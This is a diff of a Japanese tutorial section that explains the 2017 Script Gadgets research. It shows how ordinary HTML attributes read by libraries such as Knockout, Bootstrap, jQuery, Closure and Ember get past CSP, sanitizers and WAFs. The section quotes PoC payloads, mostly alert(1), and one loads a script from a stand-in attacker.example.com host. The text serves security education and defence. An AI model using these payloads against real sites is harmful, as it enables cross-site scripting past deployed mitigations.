+> Script Gadgets convert otherwise safe HTML tags and attributes into arbitrary JavaScript code execution.
+> （Script Gadgetは、それ自体は安全なHTMLタグや属性を、任意のJavaScriptコード実行へと変換する。）
+
+この節では、この技法を体系化した研究（Black Hat USA 2017 発表、同年 ACM CCS 2017 採録）と、CSPポリシーの弱点を機械的に検出するGoogleのツール「CSP Evaluator」を扱う。両者は表裏一体の関係にある。Script Gadgets研究は「ホスト許可リスト方式のCSPは、そのホストに置かれたライブラリのgadget次第でバイパスされる」という脅威モデルを実証で確立し、CSP Evaluatorは「このホストを許可すると、そこにScript Gadgetsが存在するかもしれない」という観点でポリシーを機械的に評価するツールだからである。
+
+> ⚠️ 本節では、原典スライド（Black Hat USA 2017 の PDF）から実際に抽出したペイロードと数値、および CSP Evaluator のソースコード（`github.com/google/csp-evaluator`）から抽出した実際の検査項目・重大度・許可リストバイパス一覧を用いている。本書の方針として、公開ラボの「解答」や攻撃対象を特定した攻略手順は書かない。以下のコード例は、原典が防御研究として公開した概念実証（PoC）の引用であり、仕組みの理解を目的とする。
+
+---
 
 ### 1. なぜCSPだけでは不十分なのか（背景となる原理）
 
-CSPの`script-src`ディレクティブは基本的に「**どこから読み込まれたスクリプトか（送信元）**」を制御する仕組みであり、「**そのページに元から存在する正規のJavaScriptが、DOM上の何を読んで何をするか**」までは一切関知しない。
+#### 1.1 「修正」と「緩和」の違い
 
-例えば以下のような、一見「安全そう」なCSPを考える。
+原典スライドは、まずXSSの「修正（fixing）」と「緩和（mitigating）」を峻別することから始める。
 
-```
-Content-Security-Policy: script-src 'self' https://cdn.jquery.com;
-```
+- **修正（fix）**: XSSを根本から断つ。正しいやり方は「文脈を理解し、デフォルトで安全に自動エスケープするテンプレートシステム」を使うこと（Christoph Kern 2014, Jad Boutros 2009 を引用）。ただし既存アプリの移行には多大な労力がかかることも多い。
+- **緩和（mitigation）**: 「修正は大変だから、代わりに攻撃を難しくしよう」というアプローチ。原典はこれを皮肉を込めて "The mitigator alligator circa 2016"（2016年頃の緩和ワニ）と呼ぶ。
 
-このポリシーは、インラインスクリプト（`unsafe-inline`）を禁止し、外部スクリプトも`self`と信頼できるCDNからのみ許可している。素朴な反射型XSS（`<script>alert(1)</script>`や`<img onerror=alert(1)>`のようなインラインイベントハンドラ）は、CSPによって実行がブロックされる。
+決定的な指摘は次の一文である。
 
-しかし、ページ上で読み込まれている`jQuery`自体（あるいはBootstrap、AngularJSなど）が、**DOM要素の属性を条件分岐なく解釈してコード実行に繋げる処理**を持っていた場合、攻撃者は`<script>`タグではなく、**一見無害な`<div>`や`<a>`タグに特定の属性を仕込むだけ**で、その正規コードにトリガーを引かせられる。これがScript Gadgetsの核心である。
+> Mitigations do not fix the vulnerability. They try to make the attacks harder instead. The XSS is still there, it's just presumably harder to exploit it.
+> （緩和策は脆弱性を修正しない。攻撃を難しくしようとするだけだ。XSSはそこに残ったままで、ただ悪用が「おそらく難しくなった」に過ぎない。）
 
-つまり脅威モデルはこうなる。
+Script Gadgets研究の核心は、この「おそらく難しくなった」という前提を、**16の主要ライブラリに対して実測で崩した**ことにある。
 
-- **前提1**: 何らかのHTMLインジェクション（サニタイザのバイパス、DOM-based XSSのマークアップ挿入ポイントなど）によって、攻撃者は**タグ名や属性値は制御できるが、`<script>`タグやインラインイベントハンドラ（`onerror`等）や`javascript:`スキームは使えない**（CSPやサニタイザがブロックするため）。
-- **前提2**: ページには既に、DOM上の属性・クラス名を読んで処理を行うJavaScriptライブラリ（jQuery、AngularJS、Bootstrapの各種プラグインなど）がロードされている。
-- **結果**: 攻撃者が挿入した「無害なマークアップ」を、そのライブラリが「実行指示」として誤読し、結果的に任意コード実行に至る。
+#### 1.2 各緩和策の「見ているもの」
 
-この構造は、バイナリエクスプロイトにおける **ROP（Return-Oriented Programming、既存の実行可能コード断片＝gadgetをつなぎ合わせて任意の処理を組み立てる手法）** に類似することから、研究者らは「Webのコード再利用攻撃（Code-Reuse Attacks for the Web）」と呼んでいる。ROPが「バイナリ中の既存の命令列を再利用する」のに対し、Script Gadgetsは「ページ中の既存のJavaScriptロジックを再利用する」という対応関係にある。
+原典は、当時の主要な緩和策が「何を見て危険を判定しているか」を整理する。ここが決定的に重要である。
 
-### 2. Black Hat USA 2017論文「Don't Trust The DOM: Bypassing XSS Mitigations Via Script Gadgets」
+- **WAF / XSSフィルタ（ModSecurity CRS、旧Chrome/IE/EdgeのXSS Auditor、NoScript）**: リクエストやレスポンスに含まれる**危険なタグ・属性**（`<script>`、`<XSS>`など）をパターンでブロックする。`<p width=5>` や `<b><i>` のような一見無害なマークアップは通す。
+- **HTMLサニタイザ（DOMPurify、Google Closure sanitizer）**: HTMLから**危険なタグ・属性を除去**する。許可リストにある安全そうな要素・属性（`title`、`data-*`、`id`、`class` など）は残す。
+- **CSP**: 「正規のJSコードと注入されたJSコードを区別」しようとする。手段は3つ――(1) 正規の**送信元（オリジン）を許可リスト化**する、(2) コードの**ハッシュ**を許可リスト化する、(3) 使い捨ての**nonce（秘密のトークン）**を要求する。
 
-#### 2.1 概要と位置づけ
+これらに共通する致命的な前提が、次の一文に凝縮されている。
 
-本論文はSebastian Lekies、Krzysztof Kotowicz、Eduardo Vela Nava（Google）によって2017年のBlack Hat USAで発表された（同年ACM CCS 2017にも "Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets" として採録されている）。研究の核心は、当時「XSS対策の決定打」と考えられていた複数の技術――
+> XSS mitigations work by blocking attacks. Focus is on potentially malicious tags / attributes. **Most tags and attributes are considered benign.**
+> （XSS緩和策は攻撃をブロックすることで働く。焦点は「悪意のありうるタグ・属性」に当てられる。**大半のタグ・属性は無害と見なされる。**）
 
-- Content Security Policy（CSP）
-- DOM Sanitizer（DOMPurifyなど）
-- WAF（Web Application Firewall）
-- ブラウザ組み込みのXSS Auditor / Filter（当時Chrome/IEに存在した）
+Script Gadgetは、まさにこの「無害と見なされたタグ・属性」を、ページ上の正規コードにJavaScript実行へと変換させる。CSPの`script-src`は「スクリプトがどこから来たか」しか判定せず、「ページに元からある正規のJSがDOM上の何を読んで何をするか」までは一切関知しない。この**構文（タグ・属性・URLスキーム）と意味（そのタグ・属性がどのライブラリにどう解釈されるか）のギャップ**こそ、Script Gadgetsが成立する根本原理である。
 
-――が、いずれも「**タグ・属性の並びだけを見て『危険かどうか』を判定する**」という設計上の限界を持っており、ページに元からロードされている**JavaScriptライブラリの実装次第で回避可能である**ことを、大規模な実証実験で示した点にある。
+#### 1.3 ROPとのアナロジー
 
-#### 2.2 手法（gadgetの探索）
+この構造は、バイナリエクスプロイトにおける **ROP（Return-Oriented Programming、既存の実行可能コード断片＝gadgetをつなぎ合わせて任意処理を組み立てる手法）** に対応する。CCS 2017版の論文タイトルが "**Code-Reuse Attacks for the Web**"（Webのためのコード再利用攻撃）であるのはこのためだ。ROPが「バイナリ中の既存の命令列を再利用する」のに対し、Script Gadgetsは「**ページ中の既存のJavaScriptロジックを再利用する**」。攻撃者は新しいコードを持ち込まず、ページに元からある部品を組み合わせて目的を達成する。
 
-研究チームは、Alexaランキング上位で広く使われる**主要なJavaScriptライブラリ（jQuery、AngularJS、Polymer、Bootstrap、Knockout、Ember、Google Closure、MooTools、YUI、Prototype.js など、論文では複数バージョンにわたり多数のライブラリ）を対象に静的・動的解析を行い、DOM要素の属性・クラス名・データ属性等を読み取ってコード実行につながる「gadget」を機械的に洗い出した**。
+> 出典: Breaking XSS mitigations via Script Gadgets（Sebastian Lekies, Krzysztof Kotowicz, Eduardo Vela Nava — Google, Black Hat USA 2017）— https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
 
-その結果、調査対象とした主要ライブラリの**ほぼすべてに1つ以上のgadgetが存在する**ことが判明した。これは「有名で信頼されたライブラリだから安全」という前提そのものを覆す結果であり、CSPの許可リストに「信頼できるCDNだから」という理由だけでライブラリのホストを追加することの危険性を裏付けた。
+---
 
-> ⚠️ **未取得の資料に関する補足**: Black HatのPDF本体（`blackhat.com`）は本環境のネットワーク制限により直接取得できませんでした。理由: 当該ドメインがegressプロキシでブロックされているため。原文は以下からユーザーご自身でご覧いただけます: https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
-> （以下は未取得資料の補足として、公開されている検索結果・関連論文情報・一般知識に基づく解説です。定量的な数値・図表・スライドの詳細な文言については、必ず原典PDFを直接ご確認ください。）
+### 2. Black Hat論文の全体像と数値
 
-#### 2.3 具体的なgadgetの例（jQueryを題材に）
+#### 2.1 冒頭の結論
 
-論文・関連発表で繰り返し取り上げられる典型例が、jQueryの**セレクタ処理とDOM挿入APIの組み合わせ**である。jQueryには、`$()`関数に渡された文字列がCSSセレクタなのかHTML断片なのかを内部でヒューリスティックに判定するロジックがあり、また多くのUIプラグイン（例えば旧式の`jQuery Mobile`や各種タブ/モーダルプラグイン）が「**特定の`data-*`属性やクラス名を持つ要素を見つけたら、その値をHTMLとして`.html()`や同種のsinkに渡して展開する**」という処理を実装していた。
+発表者は Sebastian Lekies（@slekies）、Krzysztof Kotowicz（@kkotowicz）、Eduardo Vela Nava（@sirdarckcat）の3名（いずれもGoogle）。スライド冒頭は挑発的な宣言で始まる。
 
-例えば、次のような疑似コードのgadgetを考える（jQuery Mobileの一部で実際に確認された種類のパターンを単純化したもの）。
+> We will show you how we bypassed **every** XSS mitigation we tested.
+> （私たちがテストした**あらゆる**XSS緩和策を、どうバイパスしたかをお見せする。）
+
+そして「16の人気ライブラリにおける、script gadgetチェーンによる緩和策バイパス可能性」を、次の集計で提示する（分母16は調査対象ライブラリ数、分子はバイパスを達成したライブラリ数）。
+
+| 緩和策のカテゴリ | 具体策 | バイパス達成 |
+|---|---|---|
+| CSP | whitelist（ホスト許可リスト） | 3 / 16 |
+| CSP | nonces（nonce方式） | 4 / 16 |
+| CSP | unsafe-eval を許可した場合 | 10 / 16 |
+| CSP | strict-dynamic | 13 / 16 |
+| XSSフィルタ | Chrome XSS Auditor | 13 / 16 |
+| XSSフィルタ | Edge | 9 / 16 |
+| XSSフィルタ | NoScript | 9 / 16 |
+| サニタイザ | DOMPurify | 9 / 16 |
+| サニタイザ | Google Closure | 6 / 16 |
+| WAF | ModSecurity CRS | 9 / 16 |
+
+この表から読み取れる最重要の教訓は、**「厳格なはずのCSPほど、gadgetの選択肢が広がる場面がある」**という逆説である。`unsafe-eval` を許可すると10/16、`strict-dynamic` に至っては13/16でバイパスが成立した。理由は後述するが、要は「eval系のgadgetを呼べる」「動的に挿入した`<script>`が信頼される」という強い実行能力を、正規ライブラリが提供してしまうからである。
+
+#### 2.2 影響範囲（なぜ気にすべきか）
+
+原典は3つの数字で「これは他人事ではない」と示す。
+
+> - Gadgets are prevalent in **all but one** of the tested popular web frameworks.（テストした人気フレームワークのうち、1つを除く**すべて**にgadgetが蔓延している。）
+> - Gadgets are confirmed to exist in **at least 20%** of web applications from Alexa top 5,000.（Alexa上位5,000サイトのうち、**少なくとも20%**にgadgetが存在することを確認した。）
+> - Gadgets can be used to bypass **most** mitigations in modern web applications.（現代のWebアプリの**大半**の緩和策をバイパスできる。）
+
+「1つを除くすべて」の「1つ」とは React である（後述のサマリで「React — no gadgets」と明記される）。
+
+> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
+
+---
+
+### 3. 具体的なgadgetの実例（原典PoCの引用）
+
+ここからは、原典スライドに掲載された**実物のペイロード**を種類別に見ていく。各例で「攻撃者が注入するのは無害なマークアップだけ」「ページ上の正規コードがそれをコード実行に変換する」という共通構造を確認してほしい。
+
+#### 3.1 導入例：架空の「ボタン」ライブラリ
+
+最初にスライドが挙げる教育用の例。ある正規コードが `data-role=button` を持つ要素を探し、その `data-text` 属性値を `.html()`（＝`innerHTML`）で描画するとする。
 
 ```html
-<!-- 攻撃者が注入できるのは <script> ではなく、この無害に見えるタグと属性のみ -->
-<div data-role="popup" data-content="<img src=x onerror=alert(document.domain)>"></div>
+<div data-role="button" data-text="I am a button"></div>
+```
+```js
+var buttons = $("[data-role=button]");
+buttons.html(button.getAttribute("data-text"));   // ← これがScript Gadget
 ```
 
-このマークアップ自体には`<script>`もインラインイベントハンドラの直接記述もなく、CSPの`script-src`にも、サニタイザの「危険タグの除去」にも引っかからないように見える。しかしページ上でjQuery Mobileの初期化コードが走ると、そのライブラリが`data-role="popup"`を持つ要素を自動的に検出し、`data-content`の値を**信頼して**`.html()`（内部的には`innerHTML`と同等）に渡して描画する。この結果、`data-content`内の`<img src=x onerror=...>`がDOM上に実体化され、`onerror`イベントハンドラとして攻撃者のJavaScriptが実行される。
-
-- **なぜ動くか**: サニタイザやCSPは「注入されたタグそのもの」しか見ていないが、ライブラリの初期化コードは**属性の値を後からHTMLとして再解釈（パーサ再解釈）してDOMに書き戻す**。この「一度は無害な形で通過したデータが、後段の正規コードによって危険なsinkに渡される」という時間差・経路の分離が、静的フィルタリングの検出網をすり抜ける根本原因である。
-
-もう一つの典型パターンは、AngularJS（1.x系、当時のsandbox機構がまだ存在した/その後撤廃された時期）における**テンプレートインジェクション系gadget**である。AngularJSは`ng-`から始まる属性やdouble-mustache構文（`{{ }}`）をテンプレートとして評価するため、攻撃者が`ng-app`や`ng-csp`が有効なページに対して、以下のような属性だけを注入できれば、AngularJSの式評価エンジンを経由してコード実行に到達できる場合があった。
+正常時は `data-text` の中身がそのままボタン文字列になる。しかし攻撃者が `data-text` にHTMLエンティティ化した`<script>`を仕込むと――
 
 ```html
-<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+<div data-role="button" data-text="&lt;script&gt;alert(1)&lt;/script&gt;"></div>
 ```
 
-- **なぜ動くか**: AngularJSのテンプレートエンジンは`{{ }}`内の文字列をJavaScript式として評価する。`constructor.constructor('alert(1)')()`は、任意のオブジェクトの`constructor`プロパティ（プロトタイプチェーンを辿って到達する`Function`コンストラクタ）を取得し、それを使って動的に新しい関数を生成・実行する**サンドボックス脱出（sandbox escape）**の定石パターンである。`<script>`タグを一切使わずに、AngularJS自身の式評価器（eval相当の機能）を「借用」して任意コードを実行させている点が、まさにScript Gadgetの本質を示している。
+`getAttribute("data-text")` は属性値をデコードした文字列 `<script>alert(1)</script>` を返し、それが `.html()` に渡って **`<script>` としてDOMに実体化**する。
 
-これらの例が示す共通原理は次の通りである。
+- **なぜ動くか**: サニタイザは注入されたHTMLの「見た目」しか見ていない。属性値の中の `&lt;script&gt;` はただのテキストであり、`title` や `data-text` のような属性は「安全」として許可される。しかし正規コードが後から `getAttribute` でその値を取り出し、HTMLとして**再パース（パーサ再解釈）**して危険なsink（`innerHTML`）に渡す。この「一度は無害なテキストとして通過したデータが、後段の正規コードで危険な文脈に置き直される」という時間差・経路分離が、静的フィルタの検出網をすり抜ける。
 
-1. **sink（危険な処理の最終到達点。例: `innerHTML`, `eval`, `Function`コンストラクタ, jQueryの`.html()`）そのものは、攻撃者が直接注入したコードから呼ばれるのではなく、ページに元から存在する正規のライブラリコードの内部から呼ばれる。**
-2. 攻撃者が制御できるのは、そのライブラリが「設定・データ」として信頼して読み取る**属性値やテキストコンテンツ**のみ。
-3. サニタイザ・CSP・WAFは「タグ名/属性名/URLスキーム」という**構文レベル**でしか判定できないため、「その属性がどのライブラリにどう解釈されるか」という**意味レベル**の危険性までは把握できない。この構文と意味のギャップこそがScript Gadgetsが成立する原理である。
+#### 3.2 Knockout：属性値を `eval()` する
 
-#### 2.4 影響範囲と結論
+Knockout の `data-bind` 属性は、内部で次のように処理される（スライドから抜粋・簡略化）。
 
-論文は、CSP・サニタイザ・WAFのいずれも単独では「防御しきれない」ことを示し、次のような結論・提言を行った。
-
-- 大手企業サイトを含む実運用サイトの多くで、CSPを導入していても信頼するホスト（CDN等）にScript Gadgetsを含むライブラリが配置されており、**理論上バイパス可能な状態**にあった。
-- 対策として、CSPは**nonceベース／hashベースのstrict-dynamic方式**（許可リスト方式ではなく、サーバが発行した使い捨てトークンで個々の`<script>`要素を認可する方式）へ移行すべきであると提言した。これはホスト許可リスト自体を廃止し、「そのホストにgadgetがあるかどうか」という問題設定自体を無効化するアプローチである。
-- サニタイザについては、**属性・タグの許可リストを最小限にし、DOM操作系ライブラリが読む可能性のある`data-*`属性やaria属性等も含めて慎重に扱う**必要性が指摘された。
-- 根本的な教訓として、「信頼されたライブラリ（trusted code）」という概念そのものが、DOM入力に対しては相対的でしかなく、**ライブラリの実装詳細まで踏み込んだ脅威分析なしにCSPやサニタイザだけで『安全』と判断してはならない**という考え方が業界に広まった。
-
-> 出典: Don't Trust The DOM: Bypassing XSS Mitigations Via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
-
-### 3. Google CSP Evaluator
-
-#### 3.1 ツールの位置づけ
-
-**CSP Evaluator**（https://csp-evaluator.withgoogle.com/）は、Googleが公開している無料のWebツール・ライブラリで、URLを入力するかCSPポリシー文字列を直接貼り付けると、そのポリシーに含まれる**構文的・意味的な弱点**を自動的に検出し、重大度（高・中・情報）付きで一覧表示してくれる。CSPをレビューする際の「静的解析器」として、Bug Bountyやセキュリティ診断の現場でも広く使われている。
-
-> ⚠️ **未取得の資料に関する補足**: `csp-evaluator.withgoogle.com`自体も本環境のegressプロキシによりブロックされ、直接の内容取得はできませんでした。以下のURLからユーザーご自身で直接ご覧いただき、実際に自社のCSPを貼り付けて挙動を確認することを推奨します: https://csp-evaluator.withgoogle.com/
-> （以下は未取得資料の補足として、一般に公開されている情報・検索結果・一般知識に基づく解説です。）
-
-#### 3.2 検出する主な問題カテゴリ（原理レベルの説明）
-
-CSP Evaluatorが指摘する代表的な弱点は、いずれも「**許可リストという発想そのものの限界**」に起因する。
-
-**(1) `unsafe-inline`の使用**
-
-```
-Content-Security-Policy: script-src 'self' 'unsafe-inline';
+```js
+switch (node.nodeType) {
+  case 1: return node.getAttribute("data-bind");
+}
+// ...
+var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
+    functionBody = "with($context){with($data||{}){return{" + rewrittenBindings + "}}}";
+return new Function("$context", "$element", functionBody);
 ```
 
-`unsafe-inline`が指定されると、ページ上のあらゆるインラインスクリプト・インラインイベントハンドラが実行可能になる。これは攻撃者が注入したインラインスクリプトも区別なく許可してしまうため、**CSPが本来防ぎたい素朴なXSSすら防げなくなる**。CSP Evaluatorはこれを最高重要度で警告する。
+`data-bind` の値がそのまま `new Function(...)` の本体に埋め込まれる。つまり実質的に `data-bind="value: foo"` は `eval("foo")` に等しい。Knockout製アプリをXSSするには、攻撃者はこれだけ注入すればよい。
 
-- **なぜ危険か（原理）**: CSPのソース許可は「スクリプトがどこから来たか」を判定基準にしているが、`unsafe-inline`はこの判定機構自体を無効化するキーワードである。ブラウザは`unsafe-inline`が指定されたポリシーでは、インラインスクリプトに対して送信元チェックを一切行わない。
-
-**(2) 広すぎるホスト許可リスト（wildcardや大手CDN全体の許可）**
-
-```
-Content-Security-Policy: script-src 'self' https://*.googleapis.com https://*.cloudflare.com;
+```html
+<div data-bind="value: alert(1)"></div>
 ```
 
-ワイルドカード（`*`）や、大規模で多目的なCDNドメイン全体を許可すると、そのドメイン配下でホストされている**無数のJavaScriptファイルのどれか一つでもJSONPエンドポイントやオープンリダイレクト、あるいは前章までで学んだScript Gadgetsを含んでいれば**、攻撃者はそのURLを`<script src="...">`として読み込ませることでCSPをバイパスできる。CSP Evaluatorは、既知のJSONPエンドポイントやgadgetを含むことが報告されているドメイン（AngularJSやjQueryなど、Script Gadgets研究で指摘されたライブラリを配信しているCDN等）を許可リストに含めている場合、具体的にそのドメインを名指しして警告する仕組みを持つ。
+- **なぜ動くか**: `data-bind` は「UIとデータの紐付け設定」を書く属性であり、サニタイザにとっては無害な`data-*`属性の一種にすぎない。だがKnockoutはその文字列を JavaScript 式として `new Function` でコンパイル・実行する。`<script>` タグも `onerror` も使っていないのに、コード実行に到達する。
 
-- **なぜ危険か（原理）**: CSPの「送信元（オリジン）ベースの許可」は、「そのオリジンにあるファイルはすべて等しく信頼できる」という強い前提の上に成り立っている。しかし実際には、同一オリジン上にJSONPエンドポイント（クエリパラメータの値をそのままJavaScriptとして返すAPI）や、前節で述べたScript Gadgetsを含むライブラリが同居していることが多く、**オリジン単位の粒度では「安全なファイル」と「危険なファイルの入口」を区別できない**。これがCSPの構造的弱点であり、CSP Evaluatorが最も重視する検査観点である。
+#### 3.3 Ajaxify：`<div>` を `<script>` に変換
 
-**(3) `base-uri`の未設定・過剰許可**
+Ajaxify は `class="document-script"` を持つすべての `<div>` を `<script>` 要素へ変換する。
 
-```
-Content-Security-Policy: script-src 'self';
-<!-- base-uri が未指定 -->
-```
-
-`<base href="...">`タグはページ内の相対URL解決の基準を変更する。`base-uri`ディレクティブが指定されていない、あるいは`*`のように緩い場合、攻撃者がHTMLインジェクションによって`<base href="https://attacker.example/">`を挿入できれば、ページ内のすべての相対パス指定のスクリプト読み込み（`<script src="/app.js">`など）が**攻撃者のサーバから読み込まれるように書き換わる**。CSPの`script-src`が`'self'`のみを許可していても、`self`が指す実体自体を`<base>`タグで攻撃者ドメインにすり替えられてしまえば意味がなくなる。
-
-- **なぜ危険か（原理）**: ブラウザは相対URLを解決する際、`document.baseURI`（`<base>`タグによって変更可能）を基準にする。CSPの`script-src 'self'`は「現在のオリジンから読み込まれたスクリプト」を許可するチェックだが、その「現在のオリジン」の解釈基準そのものが`<base>`タグで書き換え可能であるため、**チェックの前提条件自体が攻撃者に操作されてしまう**。CSP Evaluatorはこのため`base-uri 'none'`または`base-uri 'self'`の明示的な設定を強く推奨する。
-
-**(4) `object-src`の未設定**
-
-Flashなど、プラグイン（`<object>`, `<embed>`）経由でのコード実行を防ぐため、`object-src 'none'`の明示も併せてチェックされる。Flashは現在ほぼ廃止されているが、レガシー環境向けの防御として引き続き評価項目に含まれる。
-
-**(5) strict-dynamicとnonce/hashベースの推奨**
-
-CSP Evaluatorは、上記のような許可リスト方式に起因する問題を回避する解決策として、**`'strict-dynamic'`とnonceまたはhashを組み合わせた「Strict CSP」**を推奨する。
-
-```
-Content-Security-Policy: script-src 'nonce-<ランダム値>' 'strict-dynamic'; object-src 'none'; base-uri 'none';
+```html
+<div class="document-script">alert(1)</div>
 ```
 
-- **なぜ有効か（原理）**: `'strict-dynamic'`が指定されると、ブラウザは**ホスト許可リストを完全に無視**し、代わりに「ページ内で信頼された（nonceまたはhashが一致した）スクリプトによって動的に生成・挿入されたスクリプトは、その出自を継承して信頼する」という**伝播ベースの信頼モデル**に切り替える。これにより、「どのホストを許可リストに入れるべきか」という、Script Gadgets研究が突いた根本的な弱点（ホスト単位では安全性を判定できない）そのものを解消できる。逆に言えば、ホスト許可リスト方式のCSPを使い続ける限り、Script Gadgetsによるバイパスの理論的リスクは残り続ける、というのがこのツールとBlack Hat論文に共通するメッセージである。
+> And Ajaxify will do the job for you.（あとはAjaxifyが仕事をしてくれる。）
 
-#### 3.3 実務上の使い方まとめ
+- **なぜ動くか**: `class` も `<div>` も「無害」の典型。しかしライブラリ側が「このクラスの div は実はスクリプトだ」という独自の規約を持っているため、無害な要素が実行可能スクリプトに昇格する。
 
-1. 本番導入前のCSPポリシーをCSP Evaluatorに貼り付け、高重要度（赤色）の指摘（`unsafe-inline`、広すぎるワイルドカード、`base-uri`未設定など）を必ず解消する。
-2. 許可リストにCDNやサードパーティドメインを追加する際は、そのドメインが**JSONPエンドポイントやScript Gadgetsを含むことが知られていないか**を必ず確認する（CSP Evaluatorや各種CSPバイパス集の突合が有効）。
-3. 可能であれば早期に**nonceベースのstrict-dynamic方式**へ移行し、ホスト許可リスト方式そのものから脱却することを目指す。
+#### 3.4 Bootstrap：最もシンプルなgadget（属性値を`innerHTML`へ）
 
-> 出典: CSP Evaluator — https://csp-evaluator.withgoogle.com/
+原典が "the simplest gadget"（最もシンプルなgadget）と呼ぶ例。Bootstrap の tooltip は `data-html=true` のとき、`title` 属性の値を `innerHTML` として挿入する。
 
-### 4. まとめ：この章の核心
+```html
+<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'>
+```
 
-Script GadgetsとCSP Evaluatorの関係を一言でまとめると、次のようになる。
+> HTML sanitizers allow the title attribute, because it's usually safe. But they aren't, when used together with Bootstrap and other data-attributes.
+> （サニタイザは `title` 属性を許可する。通常は安全だからだ。だがBootstrapや他のdata属性と組み合わさると、そうではなくなる。）
 
-- **Script Gadgets研究**は、「CSPやサニタイザは構文（タグ・属性・URLスキーム）しか見ておらず、ページ上の正規JavaScriptが持つ『意味』までは検証できない」という**構造的な限界**を実証した。
-- **CSP Evaluator**は、その限界の中でも「せめて機械的に検出できる危険パターン（`unsafe-inline`、広すぎる許可リスト、`base-uri`の欠落など）」を洗い出し、より堅牢な**nonce/strict-dynamic方式**への移行を促す実務ツールである。
+- **なぜ動くか**: `title` はツールチップ文言に使う「安全な」属性としてサニタイザの許可リストにほぼ必ず入っている。Bootstrapは `data-html=true` の指示に従い、その安全なはずの `title` を `innerHTML` に流し込む。属性単体の安全性と、ライブラリと組み合わせた際の危険性が乖離する好例。
 
-この章で学ぶべき最重要ポイントは、**「CSPを設定した」「サニタイザを通した」という事実だけでは、Webページ上に存在する正規コードの挙動まで保証されない**という点である。次章以降では、この考え方をさらに発展させ、具体的なDOM Clobberingやミューテーションベースのサニタイザバイパスなど、より高度な「信頼された正規コードの誤用」パターンを扱っていく。
+#### 3.5 Google Closure：DOM Clobberingでスクリプト元を乗っ取る
+
+Closure は「自分自身のスクリプトURL」を検出し、同じ場所からサブリソースを読み込む。攻撃者は特定の `id` を持つ要素を注入して、その基準パスを混乱させられる。
+
+```html
+<a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//></a>
+<form id=CLOSURE_UNCOMPILED_DEFINES>
+<input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING></form>
+```
+
+- **なぜ動くか**: これは**DOM Clobbering**（別節で詳述）の応用。`id`（や `name`）を持つDOM要素は、`window` や `document` のプロパティとしてJavaScriptから参照可能になる。攻撃者が `id=CLOSURE_BASE_PATH` の要素を置くと、Closureが参照する変数 `CLOSURE_BASE_PATH` がそのDOM要素で「上書き（clobber）」され、`href` の `data:` URI をスクリプトの読み込み元だと誤認する。無害な `<a>`/`<form>`/`<input>` だけで、スクリプトの出所そのものを乗っ取る。この gadget は NoScript のバイパスにも使われた。
+
+#### 3.6 RequireJS：`data-main` で任意モジュールを読ませる
+
+```html
+<script data-main='data:1,alert(1)' src='require.js'></script>
+```
+
+> RequireJS allows the user to specify the "main" module of a JavaScript file, and it is done through a custom data attribute, of which XSS filters and other mitigations aren't aware of.
+> （RequireJSは「main」モジュールをカスタムdata属性で指定できるが、XSSフィルタや他の緩和策はその属性を知らない。）
+
+- **なぜ動くか**: `data-main` は RequireJS 独自の慣習であり、フィルタの危険パターン集に載っていない。RequireJS はその値を「読み込むべきモジュール」として `data:` URI ごと実行する。
+
+#### 3.7 Ember：strict-dynamic の突破
+
+Emberの開発版は、いったん無効なself-closingスクリプトタグから**有効なコピーを作り直して再挿入**する。strict-dynamic CSPは「動的に挿入された`<script>`」を信頼するため、これがバイパスになる。
+
+```html
+<script type=text/x-handlebars>
+  <script src=//attacker.example.com// />
+</script>
+```
+
+- **なぜ動くか**: strict-dynamicの信頼モデルは「すでに信頼されたスクリプトが**動的に生成**したスクリプトも信頼する（信頼の伝播）」というもの。Emberが元スクリプトを再構築して `appendChild` 等で挿入する行為は、CSPから見れば「信頼されたコードによる動的挿入」に該当してしまう。攻撃者が静的に置いた `<script>` はブロックされるが、Emberが再挿入したコピーは信頼されて実行される。なお、これは**開発版でのみ**成立する（サマリで "gadgets only in development version" と注記）。
+
+#### 3.8 jQuery：`<form>`+`<input>` でスクリプトを再挿入させる
+
+jQueryは、既存の`<script>`タグを取り出して再挿入するgadgetを持つ。攻撃者は `<form>` と `<input name="ownerDocument">` を注入して、jQueryのロジックを混乱させる。
+
+```html
+<form class="child">
+<input name="ownerDocument"/><script>alert(1);</script></form>
+```
+
+> Strict-dynamic CSP blocks the `<script>`, but then jQuery reinserts it. Now it's trusted and will execute.
+> （strict-dynamic CSPは`<script>`をブロックするが、jQueryがそれを再挿入する。すると信頼され、実行される。）
+
+- **なぜ動くか**: 3.7 と同じ「動的挿入は信頼される」原理。`input[name=ownerDocument]` は、jQuery内部で `elem.ownerDocument` を参照する処理を**DOM Clobbering**で乗っ取り、正常なドキュメント判定を狂わせるための仕込みである。
+
+#### 3.9 jQuery Mobile：HTMLコメントを閉じてサニタイザを破る
+
+jQuery Mobile は、要素の `id` 属性値を動的にHTMLコメント内へ埋め込む箇所がある。攻撃者はコメントを閉じるだけで任意コード実行できる。
+
+```html
+<div data-role=popup id='--><script>"use strict"
+alert(1)</script>'></div>
+```
+
+- **なぜ動くか**: `id` 属性は「安全」としてサニタイザを通過する。しかしライブラリがその値を `<!-- ... -->` の内側に文字列連結で差し込むため、値の先頭に `-->` を置けばコメントを早期終了させ、続く `<script>` を実コードとして注入できる。これはサニタイザ（DOMPurifyなど）のバイパスとして機能する。
+
+#### 3.10 Dojo Toolkit：ModSecurity CRS の突破
+
+```html
+<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">
+```
+
+- **なぜ動くか**: Dojoは `data-dojo-type`/`data-dojo-props` を宣言的なウィジェット定義として解釈・評価する。`data-*` 属性で構成されているため、ModSecurity CRS（正規表現ベースのWAF）の危険パターンに一致しない。
+
